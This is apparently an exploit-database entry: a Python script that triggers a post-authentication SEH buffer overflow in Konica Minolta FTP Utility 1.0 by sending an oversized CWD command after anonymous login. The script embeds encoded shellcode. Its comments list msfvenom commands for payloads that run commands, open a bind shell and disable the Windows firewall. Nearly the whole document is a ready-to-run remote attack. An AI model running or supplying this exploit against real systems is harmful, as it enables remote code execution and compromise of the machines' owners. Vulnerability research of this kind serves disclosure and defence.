# Title: Konica Minolta FTP Utility 1.00 Post Auth CWD Command SEH Overflow
# Published: Jun 14 2017
# Software link: http://download.konicaminolta.hk/bt/driver/mfpu/ftpu/ftpu_10.zip
# Software: Konica Minolta FTP Utility v1.0
# CVE: NaN
# Type: Remote
# Platform: Windows

#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import sys

if len(sys.argv) <= 1:
	print " EXPLOIT - Post Auth CWD Command SEH Overflow"
	print "   Target: Konica Minolta FTP Utility v1.0\n"
	print " ./"+sys.argv[0]+" [TARGET IP]"
else:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	# Shellcode examples:
	# msfvenom -p windows/exec cmd='ping 192.168.100.2' -f python -b "\x00\x0a\x0d\x3d\x5c\x2f" --smallest
	# msfvenom -p windows/shell_bind_tcp LPORT=1 -f python -b "\x00\x0a\x0d\x3d\x5c\x2f" --smallest
	# msfvenom -p windows/exec cmd='netsh firewall set opmode disable' -f python -b "\x00\x0a\x0d\x3d\x5c\x2f" --smallest
	buf =  b""
	buf += b"\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
	buf += b"\x13\x9e\xab\xab\xc3\x83\xeb\xfc\xe2\xf4\x62\x43"
	buf += b"\x29\xc3\x9e\xab\xcb\x4a\x7b\x9a\x6b\xa7\x15\xfb"
	buf += b"\x9b\x48\xcc\xa7\x20\x91\x8a\x20\xd9\xeb\x91\x1c"
	buf += b"\xe1\xe5\xaf\x54\x07\xff\xff\xd7\xa9\xef\xbe\x6a"
	buf += b"\x64\xce\x9f\x6c\x49\x31\xcc\xfc\x20\x91\x8e\x20"
	buf += b"\xe1\xff\x15\xe7\xba\xbb\x7d\xe3\xaa\x12\xcf\x20"
	buf += b"\xf2\xe3\x9f\x78\x20\x8a\x86\x48\x91\x8a\x15\x9f"
	buf += b"\x20\xc2\x48\x9a\x54\x6f\x5f\x64\xa6\xc2\x59\x93"
	buf += b"\x4b\xb6\x68\xa8\xd6\x3b\xa5\xd6\x8f\xb6\x7a\xf3"
	buf += b"\x20\x9b\xba\xaa\x78\xa5\x15\xa7\xe0\x48\xc6\xb7"
	buf += b"\xaa\x10\x15\xaf\x20\xc2\x4e\x22\xef\xe7\xba\xf0"
	buf += b"\xf0\xa2\xc7\xf1\xfa\x3c\x7e\xf4\xf4\x99\x15\xb9"
	buf += b"\x40\x4e\xc3\xc3\x98\xf1\x9e\xab\xc3\xb4\xed\x99"
	buf += b"\xf4\x97\xf6\xe7\xdc\xe5\x99\x54\x7e\x7b\x0e\xaa"
	buf += b"\xab\xc3\xb7\x6f\xff\x93\xf6\x82\x2b\xa8\x9e\x54"
	buf += b"\x7e\xa9\x96\xf2\xfb\x21\x63\xeb\xfb\x83\xce\xc3"
	buf += b"\x41\xcc\x41\x4b\x54\x16\x09\xc3\xa9\xc3\x9e\xaa"
	buf += b"\x22\x25\xf4\xbb\xfd\x94\xf6\x69\x70\xf4\xf9\x54"
	buf += b"\x7e\x94\xf6\x1c\x42\xfb\x61\x54\x7e\x94\xf6\xdf"
	buf += b"\x47\xf8\x7f\x54\x7e\x94\x09\xc3\xde\xad\xd3\xca"
	buf += b"\x54\x16\xf6\xc8\xc6\xa7\x9e\x22\x48\x94\xc9\xfc"
	buf += b"\x9a\x35\xf4\xb9\xf2\x95\x7c\x56\xcd\x04\xda\x8f"
	buf += b"\x97\xc2\x9f\x26\xef\xe7\x8e\x6d\xab\x87\xca\xfb"
	buf += b"\xfd\x95\xc8\xed\xfd\x8d\xc8\xfd\xf8\x95\xf6\xd2"
	buf += b"\x67\xfc\x18\x54\x7e\x4a\x7e\xe5\xfd\x85\x61\x9b"
	buf += b"\xc3\xcb\x19\xb6\xcb\x3c\x4b\x10\x5b\x76\x3c\xfd"
	buf += b"\xc3\x65\x0b\x16\x36\x3c\x4b\x97\xad\xbf\x94\x2b"
	buf += b"\x50\x23\xeb\xae\x10\x84\x8d\xd9\xc4\xa9\x9e\xf8"
	buf += b"\x54\x16"
	
	# Buffer = 1500 bytes
	# buffer = "\x41" * 1037 + "\xeb\x0a\x90\x90" + "\x9D\x6D\x20\x12" + "\x90" * 5 + buf + "D" * 1955
	buffer = "\x41" * 1037 + "\xeb\x0a\x90\x90" + "\x9D\x6D\x20\x12" + "\x90" * 5 + buf + "D" * (1500 - 1050 - len(buf))

	print " EXPLOIT - Post Auth CWD Command SEH Overflow"
	print "   Target: Konica Minolta FTP Utility v1.0\n"
	print " [*] Sending " + str(len(buffer)) + " bytes..."
	s.connect((sys.argv[1],21))
	data = s.recv(1024)
	s.send('USER anonymous' + '\r\n')
	data = s.recv(1024)
	s.send('PASS anonymous' + '\r\n')
	data = s.recv(1024)
	s.send('CWD ' + buffer + '\r\n')
	s.close
